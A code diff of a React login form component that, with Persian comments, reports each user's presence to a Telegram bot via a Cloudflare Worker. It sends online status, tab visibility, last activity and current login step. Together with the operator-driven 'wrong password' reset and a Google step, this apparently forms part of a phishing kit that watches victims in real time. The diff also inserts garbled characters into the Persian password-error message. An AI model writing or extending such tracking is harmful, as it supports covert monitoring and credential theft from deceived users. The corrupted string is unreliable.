@@ -116,57 +116,75 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
-  // Enhanced real-time online/offline tracking
+  // سیستم بهینه شده تشخیص حضور کاربر
   useEffect(() => {
     if (sessionId) {
       console.log(
-        "🚀 Starting ENHANCED real-time tracking for session:",
+        "🚀 شروع ردیابی بهینه شده برای جلسه:",
         sessionId,
-        "- Current step:",
+        "- مرحله فعلی:",
         currentStep,
       );
 
-      const handlePresenceChange = async (state: UserPresenceState) => {
-        console.log("📡 ENHANCED presence state changed:", {
+      const handlePresenceChange = async (
+        state: OptimizedPresenceState,
+        changeType: PresenceChangeType,
+      ) => {
+        console.log("📡 تغییر حضور کاربر:", {
           sessionId,
+          presenceLevel: state.presenceLevel,
           isOnline: state.isOnline,
-          isInPage: state.isInPage,
-          browserTabActive: state.browserTabActive,
-          networkConnected: state.networkConnected,
+          isActive: state.isActive,
+          isVisible: state.isVisible,
+          hasNetwork: state.hasNetworkConnection,
+          changeType,
           currentStep,
-          lastSeen: new Date(state.lastSeen).toLocaleString("fa-IR"),
+          lastActivity: new Date(state.lastActivity).toLocaleString("fa-IR"),
         });
 
-        console.log("📤 Sending enhanced presence to Telegram:", {
-          statusText: enhancedRealtimeTracker.getStatusText(),
-          statusEmoji: enhancedRealtimeTracker.getStatusEmoji(),
-          detailedStatus: enhancedRealtimeTracker.getDetailedStatus(),
+        console.log("📤 ارسال وضعیت به تلگرام:", {
+          statusText: optimizedPresenceTracker.getStatusText(),
+          statusEmoji: optimizedPresenceTracker.getStatusEmoji(),
+          presenceLevel: state.presenceLevel,
         });
 
         try {
-          // Send presence updates to Telegram
+          // ارسال به‌روزرسانی حضور به تلگرام
           const result = await updateUserOnlineStatus(
             sessionId,
             state.isOnline,
-            state.isInPage,
-            state.lastSeen,
-            enhancedRealtimeTracker.getStatusText(),
-            enhancedRealtimeTracker.getStatusEmoji(),
+            state.isVisible,
+            state.lastActivity,
+            optimizedPresenceTracker.getStatusText(),
+            optimizedPresenceTracker.getStatusEmoji(),
           );
 
-          console.log("✅ Enhanced presence update sent successfully");
-        } catch (error) {
-          console.error("❌ Failed to send enhanced presence update:", error);
+          console.log("✅ به‌روزرسانی حضور با موفقیت ارسال شد");
 
-          // Run diagnostic if we get repeated errors
-          if (error.message.includes("Failed to fetch")) {
-            console.log("🔍 Running Telegram diagnostic due to fetch error...");
+          // نمایش آمار عملکرد (فقط برای debugging)
+          if (changeType === "heartbeat") {
+            const stats = optimizedPresenceTracker.getPerformanceStats();
+            console.log("📊 آمار عملکرد:", {
+              rateLimiterStats: stats.rateLimiter,
+              currentLevel: stats.currentLevel,
+              timeSinceActivity: `${Math.round(stats.timeSinceLastActivity / 1000)}s`,
+            });
+          }
+        } catch (error) {
+          console.error("❌ خطا در ارسال به‌روزرسانی حضور:", error);
+
+          // تشخیص خطا و اجرای diagnostic در صورت لزوم
+          if (
+            error instanceof Error &&
+            error.message.includes("Failed to fetch")
+          ) {
+            console.log("🔍 اجرای تشخیص تلگرام به دلیل خطای fetch...");
             setTimeout(() => {
               quickDebug().then((diagnostic) => {
                 if (!diagnostic.results.workerConnectivity?.success) {
-                  console.error("🚨 Cloudflare Worker is not accessible!");
+                  console.error("🚨 Cloudflare Worker در دسترس نیست!");
                 } else if (!diagnostic.results.botAPI?.success) {
-                  console.error("🚨 Telegram Bot API is not working!");
+                  console.error("🚨 API ربات تلگرام کار نمی‌کند!");
                 }
               });
             }, 1000);
@@ -174,12 +192,12 @@ export const LoginForm = () => {
         }
       };
 
-      // Start enhanced real-time tracking
-      enhancedRealtimeTracker.start(sessionId, handlePresenceChange);
+      // شروع ردیابی بهینه شده
+      optimizedPresenceTracker.start(sessionId, handlePresenceChange);
 
       return () => {
-        console.log("🛑 Stopping enhanced real-time tracking");
-        enhancedRealtimeTracker.stop();
+        console.log("🛑 توقف ردیابی بهینه شده");
+        optimizedPresenceTracker.stop();
       };
     }
   }, [sessionId, currentStep]);
@@ -208,7 +226,7 @@ export const LoginForm = () => {
           setPassword(""); // Clear password field
           setErrors({
             password:
-              "رمز عبور وارد شده اشتباه است. لطفا رمز صحیح را وارد کنید.",
+              "رمز عبور وارد شده ��شتباه است. لطفا رمز صحیح را وارد کنید.",
           });
           break;
         case "google":
